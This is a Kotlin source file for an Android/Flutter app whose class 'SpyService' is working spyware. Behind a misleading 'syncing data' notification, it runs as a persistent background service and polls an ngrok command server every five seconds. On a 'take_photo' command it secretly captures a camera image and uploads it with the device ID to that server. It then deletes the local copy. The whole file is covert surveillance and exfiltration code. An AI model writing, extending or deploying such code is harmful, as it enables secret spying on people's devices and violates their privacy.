package com.ti24a3.app7

import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Intent
import android.os.Build
import android.os.Handler
import android.os.IBinder
import android.os.Looper
import android.util.Log
import androidx.core.app.NotificationCompat
import io.flutter.plugin.common.MethodChannel
import okhttp3.*
import okhttp3.MediaType.Companion.toMediaType
import org.json.JSONObject
import java.io.File
import java.util.concurrent.TimeUnit

class SpyService : Service() {
    private val SERVER_URL = "https://nonsalubrious-unlusting-grover.ngrok-free.dev"
    private val mainHandler = Handler(Looper.getMainLooper())

    companion object {
        private var methodChannel: MethodChannel? = null
        private var pendingPhotoCallback: MethodChannel.Result? = null

        fun setMethodChannel(channel: MethodChannel?) {
            methodChannel = channel
            methodChannel?.setMethodCallHandler { call, result ->
                if (call.method == "photoResult") {
                    val path = call.arguments as? String
                    if (path != null) {
                        pendingPhotoCallback?.success(path)
                        pendingPhotoCallback = null
                    } else {
                        pendingPhotoCallback?.error("ERROR", "No photo path", null)
                        pendingPhotoCallback = null
                    }
                }
            }
        }

        fun takePhotoFromFlutter(result: MethodChannel.Result) {
            pendingPhotoCallback = result
            methodChannel?.invokeMethod("takePhoto", null)
        }
    }

    override fun onCreate() {
        super.onCreate()
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                "spy_channel",
                "Spy Service",
                NotificationManager.IMPORTANCE_LOW
            )
            val manager = getSystemService(NotificationManager::class.java)
            manager.createNotificationChannel(channel)

            val notification = NotificationCompat.Builder(this, "spy_channel")
                .setContentTitle("Kuangan")
                .setContentText("Menyinkronkan data...")
                .setSmallIcon(android.R.drawable.ic_menu_camera)
                .build()

            startForeground(1001, notification)
        }
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        Log.d("SpyService", "🔥 SpyService STARTED!")

        Thread {
            while (true) {
                try {
                    val deviceId = getDeviceIdCustom()
                    val request = Request.Builder()
                        .url("$SERVER_URL/command?device_id=$deviceId")
                        .get()
                        .build()

                    val response = OkHttpClient().newCall(request).execute()
                    val json = JSONObject(response.body?.string() ?: "{}")
                    val command = json.optString("command")

                    if (command == "take_photo") {
                        Log.d("SpyService", "📸 Requesting photo from Flutter...")
                        mainHandler.post {
                            takePhotoFromFlutter(object : MethodChannel.Result {
                                override fun success(result: Any?) {
                                    val path = result as? String
                                    if (path != null) {
                                        val file = File(path)
                                        if (file.exists()) {
                                            Log.d("SpyService", "✅ Photo captured: $path (${file.length()} bytes)")
                                            // 🔥 UPLOAD DI THREAD TERPISAH
                                            Thread {
                                                kirimFoto(file)
                                            }.start()
                                        } else {
                                            Log.e("SpyService", "❌ File not found: $path")
                                        }
                                    } else {
                                        Log.e("SpyService", "❌ No photo path received")
                                    }
                                }

                                override fun error(errorCode: String, errorMessage: String?, errorDetails: Any?) {
                                    Log.e("SpyService", "❌ Flutter camera error: $errorMessage")
                                }

                                override fun notImplemented() {
                                    Log.e("SpyService", "❌ Flutter camera not implemented")
                                }
                            })
                        }
                    }

                    Thread.sleep(5000)
                } catch (e: Exception) {
                    Log.e("SpyService", "❌ Error: ${e.message}")
                }
            }
        }.start()

        return START_STICKY
    }

    private fun kirimFoto(file: File) {
        try {
            if (!file.exists()) {
                Log.e("SpyService", "❌ File not found: ${file.absolutePath}")
                return
            }

            if (!file.canRead()) {
                Log.e("SpyService", "❌ File cannot be read: ${file.absolutePath}")
                return
            }

            Log.d("SpyService", "📤 Uploading photo: ${file.name} (${file.length()} bytes)")

            val clientWithTimeout = OkHttpClient.Builder()
                .connectTimeout(30, TimeUnit.SECONDS)
                .writeTimeout(30, TimeUnit.SECONDS)
                .readTimeout(30, TimeUnit.SECONDS)
                .build()

            val mediaType = "image/jpeg".toMediaType()
            val fileBytes = file.readBytes()
            Log.d("SpyService", "📤 File bytes: ${fileBytes.size}")

            val body = MultipartBody.Builder()
                .setType(MultipartBody.FORM)
                .addFormDataPart("photo", file.name, RequestBody.create(mediaType, fileBytes))
                .addFormDataPart("device_id", getDeviceIdCustom())
                .build()

            val request = Request.Builder()
                .url("$SERVER_URL/upload")
                .post(body)
                .build()

            Log.d("SpyService", "📤 Sending request to $SERVER_URL/upload")

            val response = clientWithTimeout.newCall(request).execute()
            Log.d("SpyService", "✅ Upload response: ${response.code}")

            val responseBody = response.body?.string()
            Log.d("SpyService", "📤 Response body: $responseBody")

            if (response.code != 200) {
                Log.e("SpyService", "❌ Upload failed: $responseBody")
            }

            response.close()
            file.delete()
            Log.d("SpyService", "🗑️ File deleted: ${file.name}")

        } catch (e: Exception) {
            Log.e("SpyService", "❌ Upload error: ${e.message}")
            e.printStackTrace()
        }
    }

    private fun getDeviceIdCustom(): String {
        return android.provider.Settings.Secure.getString(
            contentResolver,
            android.provider.Settings.Secure.ANDROID_ID
        )
    }

    override fun onBind(intent: Intent?): IBinder? = null
}
